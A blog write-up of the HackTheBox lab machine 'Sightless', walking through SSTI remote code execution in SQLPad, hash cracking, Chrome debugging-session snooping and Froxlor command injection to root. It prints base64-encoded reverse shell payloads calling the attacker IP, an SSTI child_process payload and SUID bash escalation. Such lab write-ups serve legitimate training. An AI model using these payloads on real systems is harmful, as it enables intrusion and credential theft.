---
layout: post
title: "HTB: Sightless"
box: sightless
img: /img/sightless/sightless
author: Andrew Cherney
date: 2025-01-11
tags: htb easy-box season-6 linux webapp ssti john ssh-tunneling chrome
icon: "assets/icons/sightless.png"
post_description: "A potentially devious easy box with some interesting attack vectors and more reasons to hate Chrome. To start a subdomain referenced on the front page of port 80 can be exploited by SSTI when creating a new connection. Docker root is then used to crack a shadow hash for user as Michael. The debugging port of chrome allows for the reading of requests sent during a login to an admin portal, giving the password. That service can then be used to change a restart command for a service to run arbitrary code and achieve root."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
rustscan 10.129.16.176
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.129.16.176:21
Open 10.129.16.176:22
Open 10.129.16.176:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 21,22,80 10.129.16.176

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-09 22:22 UTC
Initiating Ping Scan at 22:22
Scanning 10.129.16.176 [2 ports]
Completed Ping Scan at 22:22, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:22
Completed Parallel DNS resolution of 1 host. at 22:22, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:22
Scanning 10.129.16.176 [3 ports]
Discovered open port 80/tcp on 10.129.16.176
Discovered open port 22/tcp on 10.129.16.176
Discovered open port 21/tcp on 10.129.16.176
Completed Connect Scan at 22:22, 0.06s elapsed (3 total ports)
Nmap scan report for 10.129.16.176
Host is up, received syn-ack (0.073s latency).
Scanned at 2024-09-09 22:22:57 UTC for 1s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

```bash
nmap -sCV -p21,22,80 10.129.16.176
Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-09 17:23 CDT
Nmap scan report for 10.129.16.176
Host is up (0.073s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.16.176]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.92%I=7%D=9/9%Time=66DF7572%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,A2,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20Serv
SF:er\)\x20\[::ffff:10\.129\.16\.176\]\r\n500\x20Invalid\x20command:\x20tr
SF:y\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20
SF:being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.76 seconds
```

## Port 21

```bash
ftp sightless.htb
Connected to sightless.htb.
220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.178.80]
Name (sightless.htb:raccoon): 
550 SSL/TLS required on the control channel
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
```

## Port 80

{% include img_link src="/img/sightless/sightless_01_front_page" alt="front_page" ext="png" trunc=600 %}

No results from subdomain or directory scan. There is a button here to head to an sqlpad demo page heading to **sqlpad.sightless.htb**, so I'll add that and **sightless.htb** to my */etc/hosts* file. 

### sqlpad.sightless.htb

![sqlpad version + dashboard]({{ page.img }}_2_sqlpad_dashboard.png)

```bash
dirsearch -u http://sqlpad.sightless.htb --recursive

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/6_Season/Sightless/reports/http_sqlpad.sightless.htb/_24-09-09_22-59-51.txt

Target: http://sqlpad.sightless.htb/

[22:59:51] Starting: 
[23:00:22] 404 -   21B  - /api/2/explore/
[23:00:22] 404 -   21B  - /api/
[23:00:22] 404 -   21B  - /api/2/issue/createmeta
[23:00:22] 404 -   21B  - /api
[23:00:22] 404 -   21B  - /api/api
[23:00:22] 404 -   21B  - /api/api-docs
[23:00:22] 404 -   21B  - /api/apidocs
[23:00:22] 404 -   21B  - /api/cask/graphql
[23:00:22] 404 -   21B  - /api/_swagger_/
[23:00:22] 404 -   21B  - /api/docs/
[23:00:22] 404 -   21B  - /api/index.html
[23:00:22] 404 -   21B  - /api/jsonws/invoke
[23:00:22] 404 -   21B  - /api/application.wadl
[23:00:23] 404 -   21B  - /api/package_search/v4/documentation
[23:00:22] 404 -   21B  - /api/config
[23:00:23] 404 -   21B  - /api/snapshots
[23:00:22] 404 -   21B  - /api/apidocs/swagger.json
[23:00:22] 404 -   21B  - /api/jsonws
[23:00:22] 404 -   21B  - /api/batch
[23:00:23] 404 -   21B  - /api/profile
[23:00:23] 404 -   21B  - /api/swagger.yml
[23:00:23] 404 -   21B  - /api/swagger/index.html
[23:00:23] 404 -   21B  - /api/swagger/swagger
[23:00:23] 404 -   21B  - /api/spec/swagger.json
[23:00:22] 404 -   21B  - /api/error_log
[23:00:23] 404 -   21B  - /api/swagger
[23:00:23] 404 -   21B  - /api/swagger.json
[23:00:23] 404 -   21B  - /api/login.json
[23:00:23] 404 -   21B  - /api/v1/swagger.json
[23:00:22] 404 -   21B  - /api/__swagger__/
[23:00:23] 404 -   21B  - /api/swagger/ui/index
[23:00:23] 404 -   21B  - /api/v2/
[23:00:23] 404 -   21B  - /api/v1
[23:00:23] 404 -   21B  - /api/proxy
[23:00:23] 404 -   21B  - /api/v2/swagger.yaml
[23:00:22] 404 -   21B  - /api/docs
[23:00:23] 404 -   21B  - /api/timelion/run
[23:00:23] 404 -   21B  - /api/version
[23:00:23] 404 -   21B  - /api/v2/helpdesk/discover
[23:00:23] 404 -   21B  - /api/swagger.yaml
[23:00:23] 404 -   21B  - /api/v4
[23:00:23] 404 -   21B  - /api/swagger-ui.html
[23:00:23] 404 -   21B  - /api/v1/
[23:00:23] 404 -   21B  - /api/swagger/static/index.html
[23:00:23] 404 -   21B  - /api/whoami
[23:00:23] 404 -   21B  - /api/vendor/phpunit/phpunit/phpunit
[23:00:23] 404 -   21B  - /api/v2/swagger.json
[23:00:23] 404 -   21B  - /api/v2
[23:00:23] 404 -   21B  - /api/v3
[23:00:23] 404 -   21B  - /api/v1/swagger.yaml
[23:00:25] 301 -  179B  - /assets  ->  /assets/
Added to the queue: assets/
[23:00:41] 200 -   10KB - /favicon.ico
[23:00:55] 200 -  297B  - /manifest.json

[23:01:30] Starting: assets/

Task Completed
```

Well I suppose I can check that api independently instead of letting this run with that many 404s.

```bash
dirsearch -u http://sqlpad.sightless.htb/api

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/6_Season/Sightless/reports/http_sqlpad.sightless.htb/_api_24-09-09_23-11-13.txt

Target: http://sqlpad.sightless.htb/

[23:11:13] Starting: api/
[23:11:37] 200 -  473B  - /api/app
[23:11:37] 200 -  473B  - /api/app/
[23:11:45] 200 -  327B  - /api/Connections
[23:11:45] 200 -  327B  - /api/connections
[23:12:20] 200 -    9B  - /api/signout
[23:12:20] 200 -    9B  - /api/signout/
[23:12:25] 200 -    2B  - /api/tags
[23:12:31] 200 -  456B  - /api/users
[23:12:31] 200 -    2B  - /api/users/admin
[23:12:31] 200 -    2B  - /api/users/login
[23:12:31] 200 -    2B  - /api/users/login.aspx
[23:12:31] 200 -  456B  - /api/users/
[23:12:31] 200 -    2B  - /api/users/admin.php
[23:12:31] 200 -    2B  - /api/users/login.jsp
[23:12:31] 200 -    2B  - /api/users/login.js
[23:12:31] 200 -    2B  - /api/users/login.php
[23:12:31] 200 -    2B  - /api/users/login.html

Task Completed
```

When making a new connection there are 3 GET requests sent out, **/api/tags** **/api/connections** and **/api/drivers**, I snagged the json being sent in the POST to **/api/connections** when making a new connection. 

```
POST /api/connections HTTP/1.1
Host: sqlpad.sightless.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sqlpad.sightless.htb/queries/new
Content-Type: application/json
Cache-Control: no-cache
Expires: -1
Pragma: no-cache
Origin: http://sqlpad.sightless.htb
Content-Length: 262
DNT: 1
Connection: close

{"name":"aaaa","driver":"mysql","data":{"host":"127.0.0.1","database":"aaa","username":"aaa","password":"aaa","mysqlCert":"aa","mysqlKey":"aa","mysqlCA":"aa","preQueryStatements":"aaaa","mysqlInsecureAuth":true},"idleTimeoutMinutes":"5","idleTimeoutSeconds":300}
```

But at no point do I see a login or an interaction with */users*, so I opt to curl it myself and check the results.

```bash
curl http://sqlpad.sightless.htb/api/users

[{"id":"da9a25f7-588c-40f5-89db-58fbebab591f","name":null,"email":"admin@sightless.htb","ldapId":null,"role":"admin","disabled":false,"signupAt":null,"createdAt":"2024-05-15T04:48:09.377Z","updatedAt":"2024-05-15T18:16:54.652Z"},{"id":"26113beb-60eb-4a58-81eb-2318e27eb3bf","name":null,"email":"john@sightless.htb","ldapId":null,"role":"editor","disabled":null,"signupAt":null,"createdAt":"2024-05-15T12:29:23.725Z","updatedAt":"2024-05-15T12:29:27.257Z"}]
```

No juicy or useful info here for now. 


# User as michael

## SSTI

In searching around for sqlpad vulnerabilities I did come across an RCE poc through SSTI: [https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation](https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation). The original post was [https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb) where it was found that the Database name field was vulnerable to SSTI. I place the payload in and try to call back to an httpserver but get no results.

![test ssti sqlpad]({{ page.img }}_3_sqlpad_ssti_test.png)

Not the end of the world I will encode a payload with base64 and try to run it.

 {% raw %}
 ```
{{ process.mainModule.require('child_process').exec('echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiYXNoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNTYgNzc3NyA+L3RtcC9m" | base64 -d | bash') }}
```
 {% endraw %}

Still not working for some reason, I decide to use that poc from earlier and run the script. 

```bash
python3 exploit.py -c "wget http://10.10.14.56:8081/ssti_test" http://sqlpad.sightless.htb 10.10.14.56
[SENDER] STARTING
```

```bash
httpserver 
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.178.80 - - [09/Sep/2024 23:45:52] code 404, message File not found
10.129.178.80 - - [09/Sep/2024 23:45:52] "GET /ssti_test HTTP/1.1" 404 -
10.129.178.80 - - [09/Sep/2024 23:45:52] code 404, message File not found
10.129.178.80 - - [09/Sep/2024 23:45:52] "GET /ssti_test HTTP/1.1" 404 -
```

Okay something I was doing was not correct. Perhaps the two types of quotes I was using broke the application logic. 

```bash
python3 exploit.py -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ni83Nzc3IDA+JjE= | base64 -d | bash" http://sqlpad.sightless.htb 10.10.14.56
[SENDER] STARTING
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.129.178.80 34916
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# id    
id
uid=0(root) gid=0(root) groups=0(root)
```

## /etc/shadow

The linpeas scan I ran found an interesting debug port active. I've seen these in other boxes and they are generally red herrings or rabbit holes. That said, this box is the rare exception to that as we will see in a moment. 

```bash
                 2874      bashlinpeas.sh
                 2873      sed-Es,gdm-password|gnome-keyring-daemon[0m|lightdm|vsftpd|apache2|sshd:,&,
                 2871      seds,knockd|splunk,&,
                 2870      sed-Es,jdwp|tmux |screen | inspect |--inspect[= ]|--inspect$|--inpect-brk|--remote-debugging-port,&,g
                 2869      seds,root,&,
                 2868      seds,root,&,
```

As root I can read */etc/shadow*, normally inside of docker containers this root password is random and useless to try and crack, but here we see a user has in fact setup an account inside of this container. 

```bash
root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

```bash
john hash --wordlist=/opt/wordlists/rockyou.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
insaneclownposse (?)
1g 0:00:00:22 DONE (2024-09-10 00:07) 0.04401g/s 2580p/s 2580c/s 2580C/s kruimel..galati
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
ssh michael@sightless.htb

The authenticity of host 'sightless.htb (10.129.178.80)' can't be established.
ECDSA key fingerprint is SHA256:6Th9DEMTEEexziNdvX2NPoVqYgfy0tKfU7N+V1IVVoM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sightless.htb,10.129.178.80' (ECDSA) to the list of known hosts.
michael@sightless.htb's password: 
Last login: Tue Sep  3 11:52:02 2024 from 10.10.14.23
michael@sightless:~$ cat user.txt
f1324e21fcd53-------------------
```

# Root

## enum

```bash
michael@sightless:~$ groups
michael
michael@sightless:~$ ls /home
john  michael
michael@sightless:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael)
michael@sightless:~$ find / -user john 2>/dev/null
/tmp/.org.chromium.Chromium.xdeXQg
/tmp/.org.chromium.Chromium.BniGOC
/tmp/Crashpad
/home/john
/proc/1173
/proc/1173/task
/proc/1173/task/1173
...
michael@sightless:~$ sudo -l
[sudo] password for michael: 
Sorry, user michael may not run sudo on sightless.
```

When running ps I did not see many processes worth investigating, but linpeas gave another story:

```bash
john        1174  0.0  0.0   2892  1008 ?        Ss   Sep09   0:00  |   _ /bin/sh -c sleep 140 && /home/john/automation/healthcheck.sh
john        1644  0.0  0.0   7372  3388 ?        S    Sep09   0:00  |       _ /bin/bash /home/john/automation/healthcheck.sh
john       31116  0.0  0.0   5772  1012 ?        S    05:13   0:00  |           _ sleep 60
root        1146  0.0  0.1  10344  4196 ?        S    Sep09   0:00  _ /usr/sbin/CRON -f -P
john        1173  0.0  0.0   2892  1008 ?        Ss   Sep09   0:00      _ /bin/sh -c sleep 110 && /usr/bin/python3 /home/john/automation/administration.py
john        1556  0.0  0.6  33660 24716 ?        S    Sep09   0:33          _ /usr/bin/python3 /home/john/automation/administration.py
john        1557  0.4  0.3 33630172 15176 ?      Sl   Sep09   3:00              _ /home/john/automation/chromedriver --port=33157
john        1568  0.7  2.8 34011320 114148 ?     Sl   Sep09   5:12              |   _ /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.BniGOC data:,
john        1574  0.0  1.4 34112452 56040 ?      S    Sep09   0:00              |       _ /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1570 --enable-crash-reporter
john        1591  0.6  3.0 34363116 122128 ?     Sl   Sep09   4:32              |       |   _ /opt/google/chrome/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --headless --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=1570 --gpu-preferences=WAAAAAAAAAAgAAAMAAAAAAAAAAAAAAAAAABgAAEAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --shared-files --fie
john        1575  0.0  1.4 34112456 56484 ?      S    Sep09   0:00              |       _ /opt/google/chrome/chrome --type=zygote --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1570 --enable-crash-reporter
john        1620  3.3  5.1 1186800244 205588 ?   Sl   Sep09  24:23              |       |   _ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1570 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=0 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1725901239943841 --launc
john        1592  0.1  2.1 33900068 86416 ?      Sl   Sep09   1:13              |       _ /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-sandbox --disable-dev-shm-usage --use-angle=swiftshader-webgl --use-gl=angle --headless --crashpad-handler-pid=1570 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,5159846673518076345,16686984776770167933,262144 --disable-features=PaintHolding --variations-seed-version --enable-logging --log-level=0 --enable-crash-reporter
```

This is that chrome debugging port I was referencing earlier. We'll come back to this after determining what use it would be to have access to a chrome session. 

```bash
michael@sightless:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:36847         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33157         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43293         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -        
```

From linpeas the config files for sites were read, in there we found additional subdomains of **admin.sightless.htb** and **web1.sightless.htb**. Now I will curl each of those ports to find the output and identify which ones are webservers.


```bash
michael@sightless:~$ curl 127.0.0.1:3000
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SQLPad</title>
  <link rel="shortcut icon" href="/favicon.ico">
  <!-- tauCharts css must be in a known path we can ref for image exports -->
  <link rel="stylesheet" href="/javascripts/vendor/tauCharts/tauCharts.min.css" type="text/css" />
  
  <script type="module" crossorigin src="/assets/index.33f5cd02.js"></script>
  <link rel="modulepreload" href="/assets/vendor.b5473de5.js">
  <link rel="stylesheet" href="/assets/index.96304ac6.css">
</head>

<body class="sans-serif">
  <div id="root"></div>
</body>

</html>michael@sightless:~$ 
michael@sightless:~$ curl 127.0.0.1:8080
<!DOCTYPE html>
<html lang="en" data-bs-theme="light">
<head>
	<!-- Required meta tags -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="robots" content="noindex, nofollow, noarchive"/>
	<meta name="googlebot" content="nosnippet"/>
	<link rel="icon" type="image/x-icon" href="templates/Froxlor/assets/img/icon.png">
	<meta name="csrf-token" content="acb33a12241a95cd9eb591809a6bd4de5a28d185" />
	<!-- Assets  -->
	<link rel="stylesheet" href="templates/Froxlor/build/assets/app-61450a15.css">
<script src="templates/Froxlor/build/assets/app-67d6acee.js" type="module"></script>

	<title>Froxlor</title>
</head>
<body id="app" class="min-vh-100 d-flex flex-column">
	
			<div class="container-fluid">
				<div class="container">
		<div class="row justify-content-center">
			<form class="col-12 max-w-420 d-flex flex-column" method="post" enctype="application/x-www-form-urlencoded">
				<img class="align-self-center my-5" src="templates/Froxlor/assets/img/logo.png" alt="Froxlor Server Management Panel"/>

				<div class="card shadow">
					<div class="card-body">
						<h5 class="card-title">Login</h5>
						<p>Please log in to access your account.</p>

						
						<div class="mb-3">
							<label for="loginname" class="col-form-label">Username</label>
							<input class="form-control" type="text" name="loginname" id="loginname" value="" required autofocus/>
						</div>

						<div class="mb-3">
							<label for="password" class="col-form-label">Password</label>
							<input class="form-control" type="password" name="password" id="password" value="" required/>
						</div>
					</div>

					<div class="card-body d-grid gap-2">
						<button class="btn btn-primary" type="submit" name="dologin">Login</button>
					</div>

											<div class="card-footer">
							<a class="card-link text-body-secondary" href="index.php?action=forgotpwd">Forgot your password?</a>
						</div>
									</div>
			</form>
		</div>
	</div>
			<footer class="text-center mb-3">
	<span>
		<img src="templates/Froxlor/assets/img/logo_grey.png" alt="Froxlor"/>
									&copy; 2009-2024 by <a href="https://www.froxlor.org/" rel="external" target="_blank">the froxlor team</a><br>
														</span>

    </footer>

		</div>
	</body>
</html>
```

## admin.sightless.htb

I'll ssh tunnel that port 8080 to my machine and see more clearly what this Froxlor login can yield.

```bash
ssh michael@sightless.htb -L 8080:localhost:8080
michael@sightless.htb's password: 
Last login: Tue Sep 10 05:08:04 2024 from 10.10.14.56
michael@sightless:~$ 
```

![no admin.sightltess.htb error]({{ page.img }}_4_froxlor_failed_config.png)

Except that isn't something I will do. The config files specified these ports are only accessible through certain domain names despite being localhost only. To get around this I can add `127.0.0.1 admin.sightless.htb` to my */etc/hosts* file to redirect the request for that domain to localhost then head to **http://admin.sightless.htb:8080/**.

![froxlor login]({{ page.img }}_5_froxlor_admin_login.png)

No vulnerable version no SQLi. The password to this is somewhere else. 

## Chrome devtools

In the HTB Sea box I inspected one of these debugging ports to no additional info, but that did give me an idea of how to inspect sessions. Firstly here I need to know which port is the debugging port, and the easiest way to determine this is to curl each one and attempt to GET /json.

```bash
michael@sightless:~$ curl http://localhost:36847/json
[ {
   "description": "",
   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:36847/devtools/page/1054568C0F21543EFB1C108FEF06E0CC",
   "id": "1054568C0F21543EFB1C108FEF06E0CC",
   "title": "Froxlor",
   "type": "page",
   "url": "http://admin.sightless.htb:8080/admin_logger.php?page=log",
   "webSocketDebuggerUrl": "ws://localhost:36847/devtools/page/1054568C0F21543EFB1C108FEF06E0CC"
} ]
michael@sightless:~$ curl http://localhost:33157/json
{"value":{"error":"unknown command","message":"unknown command: unknown command: json","stacktrace":"#0 0x560411f1ae43 \u003Cunknown>\n#1 0x560411c094e7 \u003Cunknown>\n#2 0x560411c706b2 \u003Cunknown>\n#3 0x560411c7018f \u003Cunknown>\n#4 0x560411bd5a18 \u003Cunknown>\n#5 0x560411edf16b \u003Cunknown>\n#6 0x560411ee30bb \u003Cunknown>\n#7 0x560411ecb281 \u003Cunknown>\n#8 0x560411ee3c22 \u003Cunknown>\n#9 0x560411eb013f \u003Cunknown>\n#10 0x560411bd4027 \u003Cunknown>\n#11 0x7f07af6d3d90 \u003Cunknown>\n"}}
michael@sightless:~$ curl http://localhost:43293/json
404: Page Not Found
michael@sightless:~$ curl http://localhost:33060/json
curl: (1) Received HTTP/0.9 when not allowed
```

Port 36847 gave the expected response. Next I ssh tunnel this port and open chrome, head to **chrome://inspect/#devices** and configure **localhost:36487** under network target. We should then see all available sessions and have the option to inspect and even take over the session.

![chrome inspect sessions]({{ page.img }}_6_chrome_inspect_sessions.png)

![froxlor admin logs w/ inspect element]({{ page.img }}_7_admin_logs_chrome_session.png)

The box here is configured to continually login and logout. I can't take over the session and meaningfully enumerate given the short time the account stays logged in. The tool at our disposal is inspect element, which can read the POST request data being sent for the login. It took a couple tries to screenshot but I got the password. 

![index request password leak]({{ page.img }}_8_index_login_froxlor.png)

## Froxlor

{% include img_link src="/img/sightless/sightless_9_froxlor_dashboard" alt="froxlor_dashboard" ext="png" trunc=600 %}

Somewhere here in this admin dashboard I have RCE, it's only a matter of finding where. There are php configuration tabs and I bet somewhere in there is my target.

![disabled php functions config]({{ page.img }}_10_php_fpm_disabled_functions.png)

I find some disabled functions in the configuration for php, if I have an exploit that is throwing out errors I'll return here but for now I won't touch it. I test some file uploads and it seems something forces json structured files. 

![json filter in upload]({{ page.img }}_11_upload_fail_json.png)

Now I tested if [https://github.com/mhaskar/CVE-2023-0315](https://github.com/mhaskar/CVE-2023-0315) would work before trying to find the version number. The exploit here was the log file could be defined as a rendering engine file, and through renaming something a log would be created in that rendering file containing code to be run when the file was loaded. It didn't work.

![version option in footer]({{ page.img }}_12_froxlor_version_option.png)

![froxlor version]({{ page.img }}_13_froxlor_version.png)

That version has no known critical or high level vulnerabilities. Back onto trying to find where in this dashboard I can execute or upload code. 

![export config option]({{ page.img }}_14_froxlor_export_settings_php_fpm.png)

I looked around the config file for any option that might execute code reliably, there were a few such as the mail sending config option and some service restart commands. That did give me an idea to check the php-fpm restart command in the dashboard, found at **http://admin.sightless.htb:8080/admin_phpsettings.php?page=fpmdaemons**.  

![restart command success]({{ page.img }}_15_restart_success.png)

I insert changing */bin/bash* to an SUID so I can run it as root and get a root prompt. When checking the file it seems it was already an SUID, though as a proof of concept the php-fpm service can be disabled and re-enabled from the site which would trigger this code. I initially tried a payload of `cp /bin/bash /tmp/bash && chmod u+s /tmp/bash` but an error gave me the impression **+** and **&** were not smiled upon by the backend code.

```bash
michael@sightless:~$ ls -l /bin/bash
-rwsrwxrwx 1 root root 1396520 Mar 14 11:31 /bin/bash
michael@sightless:~$ /bin/bash -p
bash-5.1# cd /root
bash-5.1# cat root.txt 
1ff7652ae4c84-------------------
```

# Beyond Root

## Froxlor Blind XSS

The chrome debugger was not the intended avenue for getting a login to the Froxlor application. In fact there is a blind XSS that is to be used. [https://github.com/froxlor/Froxlor/security/advisories/GHSA-x525-54hf-xr53](https://github.com/froxlor/Froxlor/security/advisories/GHSA-x525-54hf-xr53) is the reference to it. The payload in question is below.

{% raw %}

```javascript
